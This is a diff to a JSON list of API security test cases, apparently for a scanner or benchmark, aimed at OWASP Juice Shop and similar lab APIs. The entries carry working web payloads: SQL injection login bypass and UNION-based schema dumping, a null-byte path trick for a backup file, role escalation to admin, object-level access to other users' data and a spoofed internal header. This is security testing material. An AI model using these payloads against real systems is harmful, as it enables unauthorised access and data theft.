@@ -9,7 +9,8 @@
         "path": {
           "account_id": "2"
         }
-      }
+      },
+      "needs_live_session": false
     },
     {
       "op": "op_login_api_v1_auth_login_post",
@@ -21,7 +22,8 @@
           "username": "' OR '1'='1' -- ",
           "password": "x"
         }
-      }
+      },
+      "needs_live_session": false
     },
     {
       "op": "op_update_profile_api_v1_accounts__account_id__profile_put",
@@ -35,21 +37,24 @@
         "body": {
           "role": "admin"
         }
-      }
+      },
+      "needs_live_session": false
     },
     {
       "op": "op_purge_cache_api_v1_admin_maintenance_purge_cache_delete",
       "method": "DELETE",
       "path": "/api/v1/admin/maintenance/purge-cache",
       "owasp_category": "API5:2023 - Broken Function Level Authorization",
-      "binding": {}
+      "binding": {},
+      "needs_live_session": false
     },
     {
       "op": "op_get_debug_env_api_v1_debug_env_get",
       "method": "GET",
       "path": "/api/v1/debug/env",
       "owasp_category": "API8:2023 - Security Misconfiguration",
-      "binding": {}
+      "binding": {},
+      "needs_live_session": false
     }
   ],
   "srebench-api": [
@@ -62,7 +67,8 @@
         "path": {
           "user_id": "usr_102"
         }
-      }
+      },
+      "needs_live_session": false
     },
     {
       "op": "op_get_vault_document_vault_v1_documents__doc_id__get",
@@ -76,7 +82,8 @@
         "headers": {
           "x-internal-service": "auth-service-internal"
         }
-      }
+      },
+      "needs_live_session": false
     }
   ],
   "juice-shop": [
@@ -92,14 +99,129 @@
           "passwordRepeat": "Test1234!",
           "role": "admin"
         }
-      }
+      },
+      "needs_live_session": false
     },
     {
       "op": "op_admin_get_rest_admin_application-configuration",
       "method": "GET",
       "path": "/rest/admin/application-configuration",
       "owasp_category": "API8:2023 - Security Misconfiguration",
-      "binding": {}
+      "binding": {},
+      "needs_live_session": false
+    },
+    {
+      "op": "op_js_search_sqli",
+      "method": "GET",
+      "path": "/rest/products/search",
+      "owasp_category": "API8:2023 - Security Misconfiguration",
+      "binding": {
+        "query": {
+          "q": "a')) UNION SELECT sql, '2','3','4','5','6','7','8','9' FROM sqlite_master--"
+        }
+      },
+      "needs_live_session": false
+    },
+    {
+      "op": "op_js_ftp_acquisitions",
+      "method": "GET",
+      "path": "/ftp/acquisitions.md",
+      "owasp_category": "API8:2023 - Security Misconfiguration",
+      "binding": {},
+      "needs_live_session": false
+    },
+    {
+      "op": "op_js_metrics",
+      "method": "GET",
+      "path": "/metrics",
+      "owasp_category": "API8:2023 - Security Misconfiguration",
+      "binding": {},
+      "needs_live_session": false
+    },
+    {
+      "op": "op_js_ftp_pkgbak",
+      "method": "GET",
+      "path": "/ftp/package.json.bak%2500.md",
+      "owasp_category": "API8:2023 - Security Misconfiguration",
+      "binding": {},
+      "needs_live_session": false
+    },
+    {
+      "op": "op_js_login",
+      "method": "POST",
+      "path": "/rest/user/login",
+      "owasp_category": "guided-demo",
+      "binding": {
+        "body": {
+          "email": "__DYNAMIC__",
+          "password": "Test1234!"
+        }
+      },
+      "needs_live_session": false
+    },
+    {
+      "op": "op_users_get_api_users_id",
+      "method": "GET",
+      "path": "/api/Users/{id}",
+      "owasp_category": "API1:2023 - Broken Object Level Authorization",
+      "binding": {
+        "path": {
+          "id": "1"
+        },
+        "session_ref": "session"
+      },
+      "needs_live_session": true
+    },
+    {
+      "op": "op_js_basket_view_admin",
+      "method": "GET",
+      "path": "/rest/basket/{id}",
+      "owasp_category": "API1:2023 - Broken Object Level Authorization",
+      "binding": {
+        "path": {
+          "id": "1"
+        },
+        "session_ref": "session"
+      },
+      "needs_live_session": true
+    },
+    {
+      "op": "op_js_basketitem_negative",
+      "method": "POST",
+      "path": "/api/BasketItems",
+      "owasp_category": "guided-demo",
+      "binding": {
+        "body": {
+          "ProductId": 1,
+          "BasketId": "__NEEDS_LIVE_SESSION__",
+          "quantity": -5
+        },
+        "session_ref": "session"
+      },
+      "needs_live_session": true
+    },
+    {
+      "op": "op_js_checkout",
+      "method": "POST",
+      "path": "/rest/basket/{bid}/checkout",
+      "owasp_category": "guided-demo",
+      "binding": {
+        "path": {
+          "bid": "__NEEDS_LIVE_SESSION__"
+        },
+        "session_ref": "session"
+      },
+      "needs_live_session": true
+    },
+    {
+      "op": "op_js_order_history",
+      "method": "GET",
+      "path": "/rest/order-history",
+      "owasp_category": "API6:2023 - Unrestricted Access to Sensitive Business Flows",
+      "binding": {
+        "session_ref": "session"
+      },
+      "needs_live_session": true
     }
   ]
 }
